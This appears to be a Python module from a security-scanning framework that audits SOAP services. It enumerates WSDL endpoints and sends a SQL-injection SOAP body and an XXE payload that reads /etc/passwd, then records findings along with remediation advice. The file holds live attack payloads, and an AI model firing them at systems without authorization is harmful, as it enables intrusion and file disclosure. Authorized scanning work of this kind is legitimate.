"""SOAP audit — WSDL parsing, SOAP injection, XXE via SOAP body."""
from __future__ import annotations

import re
import sys
import time
from pathlib import Path
from urllib.parse import urljoin

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

import aiohttp

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_WSDL_EXPOSED = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
CVSS_SOAP_INJECT  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"
CVSS_XXE          = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"

WSDL_PATHS = [
    "?wsdl", "?WSDL", "/wsdl", "/service.wsdl",
    "/services", "?disco", "/api/soap", "/soap",
    "/ws", "/webservice", "/service",
]

SOAP_XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <test>&xxe;</test>
  </soapenv:Body>
</soapenv:Envelope>"""

SOAP_INJECT_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <test>
      <param>' OR '1'='1</param>
    </test>
  </soapenv:Body>
</soapenv:Envelope>"""


class SoapAudit(BaseModule):
    """SOAP service auditor — WSDL exposure, injection, XXE."""

    NAME        = "soap_audit"
    DESCRIPTION = "SOAP: WSDL enumeration, SOAP injection, XXE via SOAP body"
    PHASE       = 7
    TAGS        = ["api", "soap", "wsdl", "xxe", "owasp-a03", "cwe-611"]

    async def run(self) -> ModuleResult:
        """Discover SOAP endpoints and audit for vulnerabilities."""
        start  = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=12)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            wsdl_urls = await self._discover_wsdl(session, target)
            for wsdl_url in wsdl_urls:
                await self._audit_wsdl(session, wsdl_url, target)
            await self._test_soap_injection(session, target)
            await self._test_xxe(session, target)

        return self._make_result(start)

    async def _discover_wsdl(
        self, session: aiohttp.ClientSession, target: str
    ) -> list[str]:
        """Probe common WSDL URL patterns."""
        found: list[str] = []
        for path in WSDL_PATHS:
            url = f"{target}{path}"
            if not self.check_scope(url):
                continue
            await self.rate_limit()
            try:
                async with session.get(url, allow_redirects=True) as resp:
                    body = await resp.text(errors="ignore")
                    if resp.status == 200 and (
                        "wsdl" in body.lower() or "definitions" in body.lower()
                    ):
                        found.append(url)
                        self.log.info("WSDL found: %s", url)
            except Exception:
                pass
        return found

    async def _audit_wsdl(
        self, session: aiohttp.ClientSession, wsdl_url: str, target: str
    ) -> None:
        """Fetch and parse WSDL, report exposed operations."""
        await self.rate_limit()
        try:
            async with session.get(wsdl_url) as resp:
                body = await resp.text(errors="ignore")
        except Exception:
            return

        operations = re.findall(r'<operation\s+name="([^"]+)"', body)
        bindings   = re.findall(r'<binding\s+name="([^"]+)"', body)
        services   = re.findall(r'<service\s+name="([^"]+)"', body)

        ev = Evidence(
            request_raw=f"GET {wsdl_url} HTTP/1.1",
            response_raw=body[:600],
            extra={
                "operations": operations[:20],
                "services": services,
                "bindings": bindings,
            },
        )
        self.new_finding(
            title=f"WSDL Exposed: {wsdl_url}",
            severity=Severity.MEDIUM,
            description=(
                f"A WSDL (Web Service Description Language) document is publicly accessible "
                f"at {wsdl_url}. It exposes {len(operations)} operations, "
                f"{len(services)} services. WSDL exposure aids attackers in mapping "
                "the full attack surface of the SOAP service."
            ),
            reproduction_steps=[
                f"Navigate to {wsdl_url}",
                "Observe full WSDL document with operations and types",
            ],
            remediation=(
                "Restrict access to WSDL documents. Require authentication to "
                "retrieve WSDL. Consider disabling WSDL publication in production."
            ),
            references=["CWE-200", "OWASP A05:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_WSDL_EXPOSED,
            target=wsdl_url,
        )

    async def _test_soap_injection(
        self, session: aiohttp.ClientSession, target: str
    ) -> None:
        """Send SOAP injection payloads to candidate endpoints."""
        soap_endpoints = [f"{target}/soap", f"{target}/ws", f"{target}/service"]
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": '""',
        }
        for url in soap_endpoints:
            if not self.check_scope(url):
                continue
            await self.rate_limit()
            try:
                async with session.post(
                    url, data=SOAP_INJECT_PAYLOAD, headers=headers
                ) as resp:
                    body = await resp.text(errors="ignore")
                    sql_errors = ["sql syntax", "ora-", "mysql", "syntax error"]
                    if any(e in body.lower() for e in sql_errors):
                        ev = Evidence(
                            request_raw=f"POST {url} HTTP/1.1\n{SOAP_INJECT_PAYLOAD[:200]}",
                            response_raw=body[:400],
                            extra={"endpoint": url},
                        )
                        self.new_finding(
                            title=f"SOAP Injection SQL Error: {url}",
                            severity=Severity.HIGH,
                            description=(
                                "A SOAP body containing SQL injection characters triggered "
                                "a database error. SOAP parameters may be passed directly "
                                "to SQL queries without sanitization."
                            ),
                            reproduction_steps=[
                                f"POST {url} with Content-Type: text/xml",
                                "Include SQL injection payload in SOAP body element",
                                "Observe SQL error in response",
                            ],
                            remediation=(
                                "Validate and sanitize all SOAP parameter values. "
                                "Use parameterized queries in service implementations."
                            ),
                            references=["CWE-89", "CWE-943", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_SOAP_INJECT,
                            target=url,
                        )
            except Exception:
                pass

    async def _test_xxe(self, session: aiohttp.ClientSession, target: str) -> None:
        """Test XXE vulnerability via SOAP body DOCTYPE declaration."""
        soap_endpoints = [f"{target}/soap", f"{target}/ws", f"{target}/service"]
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": '""',
        }
        for url in soap_endpoints:
            if not self.check_scope(url):
                continue
            await self.rate_limit()
            try:
                async with session.post(
                    url, data=SOAP_XXE_PAYLOAD, headers=headers
                ) as resp:
                    body = await resp.text(errors="ignore")
                    if "root:" in body or "/bin/" in body or "daemon:" in body:
                        ev = Evidence(
                            request_raw=f"POST {url} HTTP/1.1\n{SOAP_XXE_PAYLOAD[:300]}",
                            response_raw=body[:400],
                            extra={"endpoint": url},
                        )
                        self.new_finding(
                            title=f"SOAP XXE — Local File Read via SOAP Body: {url}",
                            severity=Severity.CRITICAL,
                            description=(
                                "The SOAP service processed an XML External Entity (XXE) "
                                "payload and returned the contents of /etc/passwd. "
                                "This allows arbitrary file reads and potentially SSRF."
                            ),
                            reproduction_steps=[
                                f"POST {url} with Content-Type: text/xml",
                                "Include DOCTYPE with SYSTEM entity pointing to /etc/passwd",
                                "Observe file contents in SOAP response",
                            ],
                            remediation=(
                                "Disable XML external entity processing. "
                                "Configure the XML parser to disallow DOCTYPE declarations. "
                                "Use JAXP: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"
                            ),
                            references=["CWE-611", "OWASP A05:2021", "CVE-2019-0199"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_XXE,
                            target=url,
                        )
            except Exception:
                pass


class TestSoapAudit:
    def test_wsdl_paths_non_empty(self) -> None:
        assert len(WSDL_PATHS) >= 5

    def test_soap_xxe_payload_has_entity(self) -> None:
        assert "ENTITY xxe SYSTEM" in SOAP_XXE_PAYLOAD

    def test_cvss_vectors(self) -> None:
        for v in (CVSS_WSDL_EXPOSED, CVSS_SOAP_INJECT, CVSS_XXE):
            assert v.startswith("CVSS:3.1/")
